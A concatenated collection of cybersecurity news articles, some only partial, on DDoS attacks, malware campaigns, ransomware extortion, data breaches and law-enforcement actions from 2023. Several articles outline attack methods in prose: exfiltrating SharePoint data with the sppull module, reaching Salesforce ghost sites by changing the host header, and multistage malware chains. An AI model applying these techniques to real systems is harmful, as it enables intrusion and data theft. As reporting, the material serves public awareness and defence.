      "text": " Microsoft said that a recent connectivity issue affecting its Azure cloud platform was caused by an abnormal increase in HTTP requests, shortly after a hacking group claimed to launch a distributed denial-of-service (DDoS) attack against the service.Microsoft said it would release a full investigation with more details about the Azure outage within the next two weeks.Earlier last week, Microsoft's email service, Outlook, also suffered a series of brief worldwide outages, which Anonymous Sudan also claimed to have caused.“We will continue the attack until we get tired and go to sleep, we are currently enjoying the mood with cola and music, while Microsoft suffers,” the hacking group wrote on Telegram.The group also made a demand to Microsoft, requesting a ransom of $1 million. They threatened to continue the attacks and sell data on 30 million customers they claim to have accessed. DDoS attacks are relatively simple to launch, and generally don’t involve data theft.Microsoft would not confirm whether Anonymous Sudan was involved in the recent incidents or if any data was leaked, as its investigation is still ongoing.Cybersecurity researchers believe the group isn’t an authentic part of the larger Anonymous hacktivist movement, but “most likely created as part of a Russian information operation to harm and complicate Sweden's NATO application,” according to a report published by Swedish cybersecurity company Truesec.Chicago-based cybersecurity firm Trustwave said that there is evidence the group is financially motivated, and is a sub-group of the pro-Russia hacking group known as Killnet.Daryna Antoniuk\nis a freelance reporter for Recorded Future News based in Ukraine.

      "text": " A Romanian hacker who ran the infrastructure behind several malware strains was sentenced to three years in U.S. federal prison on Monday.Prosecutors said 39-year-old Mihai Ionut Paunescu helped run “bulletproof hosting” service PowerHost[.]ro, which helped cybercriminals distribute the Gozi Virus, the Zeus Trojan, the SpyEye Trojan, and the BlackEnergy malware. Cybercriminals used the malware strains to steal financial information, among other purposes.Paunescu rented servers and IP addresses from legitimate internet providers and then gave the tools to cybercriminals — allowing them to stay anonymous and launch attacks.Paunescu was also accused of enabling other cybercrimes through his platforms, like distributed denial-of-service (DDoS) attacks and spam campaigns. He was convicted on one charge of conspiracy to commit computer intrusion.“By allowing cybercriminals to acquire online infrastructure for their unlawful activity without revealing their true identities, Paunescu’s bulletproof hosting service shielded his criminal customers from both law enforcement and cybersecurity professionals, while enriching himself.”The Record previously reported that while Paunescu helped a variety of cybercriminal operations he was particularly close to those using the Gozi malware.More than 40,000 computers in the U.S. were infected by Gozi, including computers at the National Aeronautics and Space Administration, as well as others across Europe. U.S. officials said the malware allowed hackers to steal tens of millions of dollars from individuals, businesses and government entities due to its ability to evade antivirus software.After being unable to extradite Paunescu from Romania after his 2012 arrest, U.S. prosecutors kept tabs on him until his arrest in Colombia. He was originally facing up to 65 years in prison but pleaded guilty to lesser charges on February 24.Paunescu was given credit for serving one year and two months in Romanian and Colombian custody before being extradited to the U.S. As a condition of this sentence, he must forfeit $3.51 million and pay restitution of $18,945.During his sentencing, U.S. District Judge Lorna G. Schofield said Paunescu facilitated the distribution of “some of the most serious malware circulating at the time” and “made considerable money from it.”The other two operators behind Gozi are Russian national Nikita Kuzmin — who was arrested in California in 2013 and released in 2016 — and Deniss Calovskis, who was arrested in Latvia but never extradited due to a dispute over a potentially lengthy prison sentence.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

It concluded that the operational technology (OT) and industrial control systems (ICS) devices that present the highest risk to these industries are engineering workstations, SCADA servers, automation servers, historians and programmable logic controllers (PLCs). Among these devices, engineering workstations received the highest number of attempted attacks in the industry over the past two months, followed by SCADA servers. The news statistics reveal that 56% of engineering workstations have at least one unpatched critical vulnerability, and 16% are susceptible to weaponized vulnerabilities published for over 18 months.“In an ICS environment, it’s pretty common to have vulnerable devices, so professionals need to see what assets are on their network and additional intelligence on what those devices are actually doing,” explained Armis CTO and co-founder, Nadir Izrael. “Contextual data will enable teams to define what risk each device poses to the OT environment so that they can prioritize remediation of critical and/or weaponized vulnerabilities to quickly reduce the attack surface.”The research also highlights the vulnerabilities of devices such as uninterruptible power supplies (UPS). For instance, 60% of UPS devices have at least one unpatched critical vulnerability, potentially enabling criminals to cause physical damage. Additionally, 41% of PLCs have at least one unpatched critical vulnerability, posing a threat to large operations.According to Izrael, collaboration between OT and IT teams is crucial in addressing these vulnerabilities.“Cross-departmental projects will help streamline process and resource management and achieve greater compliance and data security,” the executive added.“Overall, to navigate the challenges of the new industrial era, security professionals need an IT/OT convergence security solution that shields all assets connected to the network.”"

      "text": " Freelance JournalistCryptocurrency wallets have been targeted by a new malware dubbed “DoubleFinger.”“As the value and popularity of cryptocurrencies continue to rise, so does the interest of cybercriminals,” commented Sergey Lozhkin, a lead security researcher at Kaspersky’s Global Research and Analysis Team (GReAT). The malware discovered by Kaspersky employs a multistage attack method that resembles an advanced persistent threat (APT). It starts with a malicious email attachment containing a PIF file, which triggers a chain of events.“The group behind the DoubleFinger loader and GreetingGhoul malware stands out as a sophisticated actor with high skills in crimeware development,” Lozhkin added.In the first stage, DoubleFinger downloads encrypted components from the image-sharing platform Imgur.com disguised as a PNG file. These components include a loader for the second stage, a legitimate java.exe file and another PNG file for later stages. DoubleFinger then executes its loader, bypassing security software, and launches subsequent stages.In the fourth stage, DoubleFinger utilizes a technique called Process Doppelgänging to replace a legitimate process with a modified one, housing the fifth-stage payload. The first detects crypto-wallet applications in the system and steals valuable data such as private keys and seed phrases. The second overlays the interface of cryptocurrency applications, intercepting user input and enabling cyber-criminals to control and withdraw funds.Some variations of DoubleFinger install the notorious remote access Trojan Remcos, granting cyber-criminals complete control of the infected system.To protect crypto wallets, Kaspersky recommends vigilance against scams, diversifying wallet usage, being aware of cold wallet vulnerabilities and purchasing hardware wallets from official sources, among others.“Protecting crypto wallets is a shared responsibility between the wallet providers, individuals, and the broader cryptocurrency community,” Lozhkin added.“By staying vigilant, implementing strong security measures, and staying informed about the latest threats, we can mitigate the risks and ensure the safety of our valuable digital assets.”"

      "text": "  Power lines distribute hydropower from a dam on the Columbia River in Washington state. The Biden administration on Wednesday announced an initiative to improve the cybersecurity of critical infrastructure. (By brewbooks, CC BY-SA 2.0, https://commons.wikimedia.org/w/index.php?curid=52426263)Researchers are at odds over the danger posed to critical infrastructure by recently discovered malware CosmicEnergy.“Given that threat actors use red team tools and public exploitation frameworks for targeted threat activity in the wild, we believe COSMICENERGY poses a plausible threat to affected electric grid assets,” the report said. Dragos also referred to CosmicEnergy’s likely origins as a training tool for detection development, concluding that while its discovery should prompt organizations to reassess their OT security it was “not an immediate risk to OT environments.\"“The primary purpose of COSMICENERGY appears to have been for training scenarios rather than for deployment in real-world environments. There is currently no evidence to suggest that an adversary is actively deploying COSMICENERGY,” wrote Jimmy Wylie, technical lead malware analyst and lead author.Mandiant said CosmicEnergy was designed to disrupt power supplies by interacting with devices using the IEC 104 protocol, such as remote terminal units (RTUs) that are commonly used in electric transmission and distribution operations.All three malware types issued IEC 104 on/off commands to interact with RTUs and possibly also used a Microsoft SQL server to access OT systems, Mandiant said.Once CosmicEnergy gained access it could initiate power disruptions by sending remote commands to powerline switches and circuit breakers. Mandiant said CosmicEnergy achieved that using two derivative components which it called Piehop and Lightwork.Piehop was a Python tool which connected to a remote MSSQL server to upload files and issue remote commands to an RTU. It used Lightwork, written in C++, to issue the IEC 104 on/off commands to the remote system before immediately deleting the executable.Dragos said because Lightwork was compiled with symbol information, its researchers were able to decompile the function and argument names used in the malware code. That led to the discovery that the majority of Lightwork’s code was actually from a known, reputable IEC open-source library.Industroyer and Industroyer2, on the other hand, used a custom IEC 104 library, leading Dragos to conclude that Lightwork was not a variant of the other two tools.Lightwork was also hard-coded to affect a specific IEC 104 network configuration, whereas Industroyer and Industroyer2 had configuration formats that allowed a range of parameters to be changed to suit the network being targeted.“In its current form, COSMICENERGY is not a direct threat to OT. Indications that it is a training tool with coding errors and a lack of development maturity lessen its potential risk,” Wylie wrote.While Mandiant and Dragos reached different conclusions about the threat posed by CosmicEnergy, the two teams agree their research should sound a warning to OT network operators.“This discovery suggests that the barriers to entry are lowering for offensive OT threat activity since we normally observe these types of capabilities limited to well-resourced or state sponsored actors,” Mandiant said.Given this was the third discovery of a malware tool targeting the IEC 104 protocol, organizations with industrial control system (ISC) and OT networks should take note and ensure they are prepared to detect and mitigate future attacks, Dragos said.“Even though there’s no evidence that COSMICENERGY is being deployed, its existence should prompt all organizations to reassess their firewall rules and configurations and ensure they have visibility into the ICS protocols traversing their network.”Simon Hendery is a freelance IT consultant specializing in security, compliance, and enterprise workflows.

Inadequate security, misconfigurations, and out of date software make these devices more vulnerable to exploitation. The risk is further compounded if device management interfaces are connected directly to, and accessible from, the public-facing internet.”“In the context of this Directive, a ‘networked management interface’ is a device interface dedicated to configuration and management operations (meant exclusively for authorized users to perform administrative activities on a device, a group of devices, or the network itself, and is accessible from a network over a network protocol),” the guide states. “Other terms used to describe these types of interfaces include management interface, administrative (admin) interface, and ‘back end’ interface.”The directive applies to federal contractors as well as civilian executive branch agencies. It explicitly excludes Application Programming Interfaces (API), management portals or web applications that manage offerings from third-party cloud providers. However, the implementation guidance states that certain infrastructure-as-a-service and platform-as-a-service devices might qualify, while most software-as-a-service applications would not.CISA plans to offer agencies an interface to report vulnerable devices as well as a standardized remediation templates, and coordinate with CIOs, CISOs and other agency leaders to map out and address covered IT.

      "text": "  Zacks Investment Research confirmed Tuesday that an unconfirmed number of Zacks.com customers had their encrypted passwords stolen as part of a prior data breach by an unknown third party. The company said the breach was tied to an unspecified previous hack when a third party pilfered \"a smaller subset of customers whose unencrypted passwords were compromised.\"The statement to SC Media comes a day after a report by breach notification website Have I Been Pwned? (HIBP) revealed that data tied to nearly 9 million Zacks.com customers are reportedly circulating “on a popular hacking forum.”“We have confirmed that in association with a prior data breach disclosed by Zacks, which relates to a smaller subset of customers whose unencrypted passwords were compromised, the unauthorized third parties also gained access to encrypted passwords of zacks.com customers,” according to a written statement to SC Media by Terry Ruffolo, media relations director for Zacks. Ruffolo did not confirm how many customers were impacted and said Zacks has “no reason to believe any customer credit card information or any other customer financial information was accessed for any Zacks customer at any time.”According to the Monday HIBP report, data tied to Zacks customers dates back to May 2020.“In December 2022, the investment research company Zacks announced a data breach. The following month, reports emerged of the incident impacting 820k customers,” HIBP wrote.The 2022 breach may have included additional data, HIBP suggests. “[I]n June 2023, a corpus of data with almost 9M Zacks customers appeared before being broadly circulated on a popular hacking forum,” the report states.In all, 8,929,503 Zacks customers are impacted, HIBP said.“On disclosure of the larger breach, Zacks advised that in addition to their original report ‘the unauthorised third parties also gained access to encrypted [sic] passwords of zacks.com customers, but only in the encrypted [sic] format,'” HIBP wrote.“We regret any inconvenience to our customers and we remain vigilant in protecting their personal information,” the company said.“On December 28, 2022, our team identified that an unknown third-party gained unauthorized access to certain customer records and we took immediate action to implement additional security measures to our network, and to investigate and understand the scope of the incident. While the customer information at issue is limited, and we have no indication that the accessed information has been used inappropriately, we seek to be transparent with you, our customers, and the public generally.” – Zacks.com.Zacks' compromised data included passwords stored as unsalted with SHA-256 hashes, according to HIBP. This type of data protection meets industry expectations for protecting data, however it is not foolproof when it comes to protecting data from being compromised.Password hashing salting is a way to keep passwords safe if they should fall into the hands of hackers. When a password is stored, a process called salting adds a layer of password protection that can make it extremely hard — but not impossible — to create automated type dictionary attacks where computers automate account compromises.In the case of Zacks, data passwords were not salted but hashed. Techniques have been developed to bypass, not crack, SHA-256 hashed data.Tom Spring is Editorial Director for SC Media and is based in Boston, MA.

      "text": "  Honeypots focused on tracking activity on database servers based in Russia, Ukraine, Poland, the UK, China, and the U.S. found that Microsoft SQL (MSSQL) made up 93% of all attack activity.“This means using strong, unique passwords and unusual usernames, using strong and secure authentication, disabling default accounts and enabling multi-factor authentication,” said the researchersThe SpiderLabs researchers said security teams should also keep a close eye on who’s trying to access the system and with which privileges, as well as keeping software up to date and to conduct frequent security audits. They added that the lopsided results around MSSQL convinced them to do another study around MSSQL that will come out later this month. While the UK had the most MSSQL attacks (21.84%), China (21.49%) was a close second followed by Ukraine (19.52%), Russia (17.54%), Poland (11.54%), and the United States (8.08%). The attacks carried out against MSSQL instances were very intense. According to Shodan, there are over 450,000 MSSQL instances available on the internet with more than 133,000 instances located in China.The researchers were somewhat surprised by the high attack activity recorded on the tcp/6379 port for the Redis database. Redis, the second most attacked database, was launched in 2009, but it’s becoming more popular at companies and also among attackers. According to Shodan, Redis instances are above 270,000, while instances with open port 6379/tcp are above 600,000 — so it makes sense this database has become attractive to attackers.Along with MSSQL and Redis, SpiderLabs set sensors on the following other databases: MySQL, MongoDB, PostgreSQL, Oracle DB, IBM DB2 (Unix/Win), Cassandra, and Couchbase. The database servers were listening on their default TCP ports.Setting up such honeypots have become a vital piece of defense intelligence when leveraged correctly and objectively analyzed, said Andrew Barratt, vice president at Coalfire. Barratt said security teams can use this data to offer proof of the ongoing hostility on the internet. “Often the question of ‘does this really happen’ comes up from executive leaders, and honeypots provide some interesting insights into tactics being deployed that can make the need for cyber defense budgets more real,” said Barratt.Joseph Carson, chief security scientist and Advisory CISO at Delinea, said the latest blog from Trustwave highlights where cybercriminals have more automation and experience with different types of databases. Carson said attackers tend to try and automate as many known exploits as possible and credential-based attacks so when new databases appear on the public internet the automated bots focus and attack them with increased intensity. “Less common databases tend to be less targeted, but the attackers who have more experience and get hands on will likely have more success,” said Carson. “So it comes as no surprise that MSSQL is a top target due to its common usage, however, the hope is that the best security practices are in place such as multi-factor authentication, strong privileged access controls and patch management to ensure that all known and common vulnerabilities are patched.”November 10, 2023Ukraine had experienced a less than a day-long power outage in October 2022 following an attack by Russian state-sponsored hacking operation Sandworm targeted at an electrical substation amid the ongoing Russia-Ukraine war, marking the first cyberattack-related power interruption in the country since 2017, CyberScoop reports.Attacks deployed by Iranian state-backed threat operation MuddyWater against Israel saw the utilization of the new MuddyC2Go command-and-control framework, which replaced the PhonyC2 custom platform following the exposure of its source code, reports The Hacker News.On-Demand EventOn-Demand EventOn-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

Gox back in 2011. Bilyuchenko is also charged with conspiring with Alexander Vinnik to operate BTC-e from 2011 to 2017.Bilyuchenko, Verner and their co-conspirators allegedly gained unauthorized access to a Mt Gox server to access the bitcoin and then launder the virtual cash through two other online bitcoin exchanges.The pair are also accused of using an advertising contract with Bitcoin brokerage service New York Bitcoin Broker to launder more of the money, by requesting the latter to make wire transfers into offshore accounts in the name of shell companies.New York Bitcoin Broker is thought to have transferred around $6.6m in this way between 2012 and 2013.Mt Gox was forced to cease trading in 2014 after the long-running theft was revealed.Vinnik was arrested in Greece several years ago and is now is now awaiting trial in California on charges of running BTC-e, having been detained in France for money laundering offenses. He’s also thought to have been instrumental in helping to develop the Locky ransomware variant.It’s unclear where Bilyuchenko or Verner are currently living, but they’re unlikely to face trial if based in Russia."

      "text": " Zero trust takes a \"stranger-danger\" approach to authentication that assumes all users and devices are considered untrustworthy, whether they are accessing networks and data from inside an enterprise's physical environment or outside it. In a zero-trust world, a trusted identity is the key that unlocks access for people and devices to enter an enterprise's key networks, systems, and resources.Since 2010, the term \"zero trust\" has been a popular topic for industry events, publications, and webinars. To support the rapid adoption of remote and hybrid work models over the last few years, zero-trust initiatives have become widely embraced in enterprise security postures.If you're thinking about implementing zero trust in your organizations, consider the answers to these questions to help you decide the best way to do so.In addition to ensuring everything accessing an enterprise infrastructure has the appropriate rights and aligning security measures with White House directives, what is the role of zero-trust identity in authentication?In the beginning of this article, I mentioned the term \"trusted identity.\" The entire concept of zero trust is based on restricting access until those requesting it can prove they are a trusted individual or device with permission to gain entry. Therefore, there must be a strong method that helps enterprises authenticate that the individuals or devices requesting access are trusted to do so.PKI helps prove trusted identities by enabling enterprises to assign a trust anchor to devices and personnel accessing their networks. It does this by issuing certificates to devices or authorized users using a trusted certificate issuance route, which cannot be fooled by traditional authentication methods, such as a password with special characters.In a zero-trust environment, each individual, device, and application within an enterprise utilizes a certificate to prove their trusted identity and gain access to resources. How can enterprise IT teams manage these tens of thousands of certificates without being glued to a computer 24 hours a day, seven days a week?What do enterprises need to do to manage their daily PKI operations?In terms of PKI infrastructure management, organizations must establish a strong foundation for a successful zero-trust environment and maintain a direct line of sight to all certificates within the organization. Ideally, they can leverage the tools they already have, rather than having to learn, purchase, or maintain additional resources. Their goal is to achieve end-to-end trust, scalability, and cost efficiency, as well as the freedom to retain control of their private trust assets, to achieve a zero-trust PKI operation.About the AuthorMrugesh Chandarana is Product Management Director for Identity and Access Management Solutions at HID Global, where he focuses on IoT and PKI solutions.

      "text": " The threat actor known as RomCom has returned to the scene, targeting Ukrainian politicians and a healthcare organization in the United States involved with aiding refugees fleeing the war-torn country.The deployment of this attack is through a trojanized version of Devolutions Remote Desktop Manager, which victims were likely encouraged to download after being directed to a cloned website through phishing tactics.By creating fake websites that closely resemble the legitimate software sites, RomCom can distribute malicious payloads to unsuspecting victims who download and install the compromised software, thinking it's legitimate.The trojanized installer begins installing malware after the user is prompted to select the destination path where they’d like the files to be installed. It then begins systematically collecting essential host and user metadata from the infected system, which is subsequently transmitted to its command-and-control (C2) server.The campaign strongly suggests that the motivation of this threat actor is not money, but rather a geopolitical agenda that is guiding its attack strategy and targeting methods.Recon on what software targets use in order to deliver fake update notifications was part of the process, according to Dmitry Bestuzhev, senior director, CTI, BlackBerry. \"In other words, the threat actor behind RomCom RAT relies on previous information about each victim, such as what software they use, how they use it, and the social or political programs they're working on.\"The endgame is the exfiltration of sensitive information. \"We saw RomCom targeting military secrets, such as unit locations, defensive and offensive plans, arms, [and] military training programs,\" Bestuzhev notes.He says with the US-based healthcare providing aid to the refugees from Ukraine, the targeted information included how that program works to determine who the refugees are — that includes the refugees' personal information, which can be used for further attacks.Callie Guenther, cyber threat research senior manager at Critical Start, explains that in the most recent campaigns, along with using different software, RomCom also adapted its C2 infrastructure to blend in with legitimate network traffic.\"This could involve using communication protocols commonly associated with political campaigns or healthcare organizations, making it more challenging to detect their malicious activities,\" she says.She adds that social media was an important part of the recent campaigns. \"RomCom may employ phishing emails, spear-phishing, or other social engineering techniques tailored to the targeted individuals or organizations,\" she explains.For politicians, they could craft email messages impersonating political colleagues or officials, and in the case of the healthcare company, they might send emails posing as healthcare regulatory authorities or vendors of medical equipment or software.Guenther says RomCom's active development of new capabilities and techniques indicates a notable level of sophistication and adaptability.\"This suggests that their target selection may evolve as they refine their tactics and seek new opportunities for compromise,\" she says.Mike Parkin, senior technical engineer at Vulcan Cyber, says the standard defense tactics apply here as they do with any attacker, regardless of whether they are cybercriminal or state sponsored.\"Keep patches up to date. Deploy following industry best practices and vendor 'secure installation' recommendations,\" he says. \"Make sure users are trained and cultivate a secure culture which makes them part of the solution rather than the most vulnerable part of the attack surface.\"Bestuzhev says the threat actor behind RomCom relies on social engineering and trust. So, employee training on how to spot spear phishing is also important.\"Secondly, it's important to rely on a good cyber threat intelligence program providing contextual, anticipative, and actionable threat intelligence, such as behavior rules to detect RomCom's ops in the systems, network traffic, and files,\" he says. \"With this context about RomCom, there is room for building an effective threat modeling based on the tactics, techniques, and procedures (TTP), and geopolitical developments.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

Some of the domains also masquerade as sites belonging to the Libyan Foreign Affairs Ministry.Sergey Shykevich, threat intelligence group manager at Check Point, says the delivery mechanism of the downloader is currently unknown, but phishing messages were the most likely tactic being used. Looking at the infrastructure, he says that the researchers “saw emphasis on targeting the Libyan government.”However, version 8 of the C2 in the Stealth Solder malware was also resolved by multiple Eye on the Nile domains, according to Check Point researchers, while several infrastructure overlaps with known Eye on the Nile domains were also spotted.Asked if he believes that the Eye on the Nile and Stealth Soldier malware types are being used by the same attackers or if it's just the same potentially rented C2s and malware used, Shykevich says the evidence only \"gives us medium confidence of the link between the current campaign to Eye on the Nile: Based just on the overlaps we saw, it is difficult to claim with 100% confidence that it is the same group, but there is a good chance it is.\"The researchers acknowledged that Libya is not often the focus of APT reports, but the investigation suggests that the attackers behind this campaign are politically motivated and are utilizing the Stealth Soldier malware and the significant network of phishing domains to conduct surveillance and espionage operations against Libyan targets.\"Given the modularity of the malware and the use of multiple stages of infection, it is likely that the attackers will continue to evolve their tactics and techniques and deploy new versions of this malware in the near future,\" the researchers said in the advisory.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " The 0mega ransomware group has successfully pulled off an extortion attack against a company's SharePoint Online environment without needing to use a compromised endpoint, which is how these attacks usually unfold. Instead, the threat group appears to have used a weakly secured administrator account to infiltrate the unnamed company's environment, elevate permissions, and eventually exfiltrate sensitive data from the victim's SharePoint libraries. The data was used to extort the victim to pay a ransom.\"Companies have been trying to prevent or mitigate ransomware-group attacks entirely through endpoint security investments,\" Chisholm says. \"This attack shows that endpoint security isn't enough, as many companies are now storing and accessing data in SaaS applications.\"The attack that Obsidian observed began with an 0mega group actor obtaining a poorly secured service account credential belonging to one of the victim organization's Microsoft Global administrators. Not only was the breached account accessible from the public Internet, it also did not have multi-factor authentication (MFA) enabled — something that most security experts agree is a basic security necessity, especially for privileged accounts.The threat actor used the compromised account to create an Active Directory user — somewhat brazenly — called \"0mega\" and then proceeded to grant the new account all the permissions needed to create havoc in the environment. These included permissions to be a Global Admin, SharePoint Admin, Exchange Admin, and Teams Administrator. For additional good measure, the threat actor used the compromised admin credential to grant the 0mega account with so-called site collection administrator capabilities within the organization's SharePoint Online environment and to remove all other existing administrators.In the attack that Obsidian analyzed, 0mega threat actors used the compromised admin credential to remove some 200 administrator accounts within a two-hour period.Armed with the self-assigned privileges, the threat actor then helped themselves to hundreds of files from the organization's SharePoint Online libraries and sent them off to a virtual private server (VPS) host associated with a Web hosting company in Russia. To facilitate the exfiltration, the threat actor used a publicly available Node.js module called \"sppull\" that, among other things, allows developers to interact with SharePoint resources using HTTP requests. As its maintainers describe the module, sppull is a \"simple client to pull and download files from SharePoint.\"Usually, in attacks targeting SaaS applications, ransomware groups compromise an endpoint and then encrypt or exfiltrate files, leveraging lateral movement as necessary, Chisholm says. \"In this case, the attackers used compromised credentials to log into SharePoint Online granted administrative privileges to a newly created account, and then automated data exfiltration from that new account using scripts on a rented host provided by VDSinra.ru.\" The threat actor executed the whole attack without compromising an endpoint or using a ransomware executable. \"To the best of our knowledge, this is the first publicly recorded instance of automated SaaS ransomware extortion occurring,\" he says.Chisholm says Obsidian has observed more attacks targeting enterprise SaaS environments in the last six months than in the previous two years combined. Much of the growing attacker interest stems from the fact that organizations are increasingly putting regulated, confidential, and other sensitive information into SaaS applications without implementing the same kind of controls as they are on endpoint technologies, he says. \"This is just the latest threat technique we're seeing from bad actors,\" he says. \"Organizations need to be prepared and ensure they have the right proactive risk management tools in place across their entire SaaS environment.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " New sanctions in the United Kingdom will block Belarusian media organizations from supporting the Russian invasion of Ukraine by spreading propaganda online in Britain, the government announced on Thursday.Social media companies, app stores and internet service providers operating in Britain will be obliged to prevent the designated Belarusian organizations from reaching audiences in the country.The Foreign Office said the new measures “provide the government with the ability to prevent designated Belarusian media companies from spreading propaganda in the UK.”Under the new designation criteria, the government’s sanctions will target “a broader range of people who prop up the [Lukashenko] regime,” including the “close family members of those already sanctioned.”Announcing the sanctions, Britain's Foreign Secretary, James Cleverly, said: “This new package ratchets up the economic pressure on Lukashenko and his regime which actively facilitates the Russian war effort and ignores Ukraine’s territorial integrity.“Our support for Ukraine will remain resolute for as long as it takes and the UK will not hesitate to introduce further measures against those who prop up Putin’s war.”Alexander Martin is the UK Editor for Recorded Future News.

      "text": "  Threat actors could gain access to improperly deactivated or unmaintained Salesforce sites by changing the host header, thereby gaining access to sensitive personal and business data.“Because these unused sites are not maintained, they aren’t tested against vulnerabilities, and admins fail to update the site’s security measures according to newer guidelines,” Bachrach, the author of the Varonis post, wrote. Ghost sites start when custom domain names are created and point to the Salesforce Community Site by configuring the DNS record. Risk is introduced when companies move to a different vendor, Bachrach explained. Varonis Threat Labs researchers discovered, many companies only changed the DNS records and did not remove the custom domain or deactivate the Salesforce Site.Since the Salesforce site is still active, attackers can access them by simply changing the host header. Tools that index and archive DNS records, such as SecurityTrails, make identifying ghost sites easier for attackers, Bachrach noted. “Our research found many such sites with confidential data, including PII and sensitive business data that were not otherwise accessible,” he wrote. “The exposed data is not restricted to only old data from when the site was in use; it also includes new records that were shared with the guest user due to the sharing configuration in their Salesforce environment.”To avoid the issue, Varonis researchers said that Salesforce Communities should be deactivated.Stephen Weigand is managing editor and production manager for SC Media.

      "text": " Reporter, Infosecurity MagazineMeanwhile, some generative AI developers are looking into how they could help secure their models and services. Google, owner of the generative AI chatbot Bard and parent company of AI research lab DeepMind, introduced its Secure AI Framework (SAIF) on June 8, 2023.The effort builds on Google’s experience developing cybersecurity models, such as the collaborative Supply-chain Levels for Software Artifacts (SLSA) framework and BeyondCorp, its zero trust architecture used by many organizations.Specifically, SAIF is “a first step” designed to help mitigate risks specific to AI systems like theft of the model, data poisoning of the training data, malicious inputs through prompt injection and extracting confidential information in the training data.SAIF is built around six core principles:“We will soon publish several open-source tools to help put SAIF elements into practice for AI security,” Hansen and Venables said.They also vowed to expand Google’s bug hunter programs to reward and incentivize research around AI safety and security."

With  Common Vulnerability Scoring System (CVSS) 9.8, the critical flaw exposed organizations to unauthorized access due to the use of default configurations. The JsonWebToken vulnerability (tracked CVE-2022-23529) is also mentioned in the report. The flaw was a significant concern, initially assigned a high CVSS score of 9.8. However, upon closer examination and thorough analysis, the severity of this vulnerability was reevaluated and subsequently retracted. This highlights the critical role of meticulous scrutiny and active community involvement in ensuring precise assessments and effective mitigation strategies.Another vulnerability mentioned in the report (tracked CVE-2023-28858) had a CVSS score of 3.7 and affected the Open AI ChatGPT service, resulting in a leak of user data.“Security teams should give it attention, as even low-severity vulnerabilities in critical services can have significant consequences,” Guenther said. To stay resilient against evolving cyber threats, the report says security leaders and teams must remain informed about the latest vulnerabilities and take proactive measures to mitigate the associated risks. The security expert also emphasized the importance of considering various factors when evaluating the severity of an exploit, such as the number of targets affected.“The bottom line is that if a CVE applies in your environment, you need to address it. If the CVE has exploits in the wild, you need to address it now,” Parkin added."

      "text": " A new custom backdoor dubbed Stealth Soldier has been deployed as part of a set of highly-targeted espionage attacks in North Africa.The ongoing operation is characterized by the use of command-and-control (C&C) servers that mimic sites belonging to the Libyan Ministry of Foreign Affairs. The earliest artifacts associated with the campaign date back to October 2022.The attacks commence with potential targets downloading bogus downloader binaries that are delivered via social engineering attacks. The intermediate payloads act as a conduit for retrieving Stealth Soldier, while simultaneously displaying a decoy empty PDF file.The custom modular implant, which is believed to be used sparingly, enables surveillance capabilities by gathering directory listings and browser credentials, logging keystrokes, recording microphone audio, taking screenshots, uploading files, and running PowerShell commands.\"The malware uses different types of commands: some are plugins that are downloaded from the C&C and some are modules inside the malware,\" Check Point said, adding the discovery of three versions of Stealth Soldier indicates that it's being actively maintained by its operators.Some of the components are no longer available for retrieval, but the screen capture and browser credential stealer plugins are said to have been inspired by open source projects available on GitHub.The development signals the \"first possible re-appearance of this threat actor\" since then, suggesting the group is geared towards surveillance against Egyptian and Libyan targets.\"Given the modularity of the malware and the use of multiple stages of infection, it is likely that the attackers will continue to evolve their tactics and techniques and deploy new versions of this malware in the near future,\" Check Point said.Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."

      "text": " The U.S. State Department is offering a reward of up to $5 million for information that leads to the arrest of a 40-year-old Swedish national who acted as the administrator of an encrypted communication service used by criminal gangs worldwide.The Anom devices were secretly operated by American and Australian law enforcement agencies — instead of providing secure communication, they helped the authorities to monitor the activity of criminals who used the devices.More than 12,000 Anom devices were sold to 300 criminal syndicates starting in 2018, including the Italian mafia, Albanian mafia, drug syndicates, and other organized crime groups.Rivkin was one of 17 foreign nationals who U.S. authorities indicted in the alleged distribution of the FBI’s devices.U.S. officials said it’s unclear where Rivkin resides, but that he can be identified by scars on his left knee and fingers, as well as a tattoo of three monkeys on his right arm.The distribution of the Anom devices was part of an operation known as Trojan Shield. These encrypted phones were developed by a criminal who cooperated with the FBI in exchange for a reduced sentence.The Anom devices were designed to look like regular smartphones running on the Android operating system. However, they didn’t have common functionalities like voice calling and internet browsing — their main purpose was to provide a supposedly secure and covert platform for criminals to communicate.The app was promoted through word of mouth and by undercover agents. Law enforcement agencies controlled Anom’s server infrastructure and were able to intercept and decrypt messages sent by criminals.This allowed them to gather valuable intelligence on criminal activities, identify key individuals involved, and track their movements.Daryna Antoniuk\nis a freelance reporter for Recorded Future News based in Ukraine.

      "text": " \n      Award-winning news, views, and insight from the ESET security community\n    \n        Award-winning news, views, and insight from the ESET security community\n      ESET ResearchA curious case of a threat actor at the border between crimeware and cyberespionage\n08 Jun 2023\n • \n, \n19 min. read\n\nKey points of this blogpost:\n\nAsylum Ambuscade has been operating since at least 2020.\nIt is a crimeware group that targets bank customers and cryptocurrency traders in various regions, including North America and Europe.\nAsylum Ambuscade also does espionage against government entities in Europe and Central Asia.\nMost of the group’s implants are developed in script languages such as AutoHotkey, JavaScript, Lua, Python, and VBS.\n\nAsylum Ambuscade has been running cyberespionage campaigns since at least 2020. We found previous compromises of government officials and employees of state-owned companies in Central Asia countries and Armenia.In 2022, and as highlighted in the Proofpoint publication, the group targeted government officials in several European countries bordering Ukraine. We assess that the goal of the attackers was to steal confidential information and webmail credentials from official government webmail portals.The compromise chain starts with a spearphishing email that has a malicious Excel spreadsheet attachment. Malicious VBA code therein downloads an MSI package from a remote server and installs SunSeed, a downloader written in Lua.Figure 1. Document leveraging the Follina vulnerabilityThen, if the machine is deemed interesting, the attackers deploy the next stage: AHKBOT. This is a downloader written in AutoHotkey that can be extended with plugins, also written in AutoHotkey, in order to spy on the victim’s 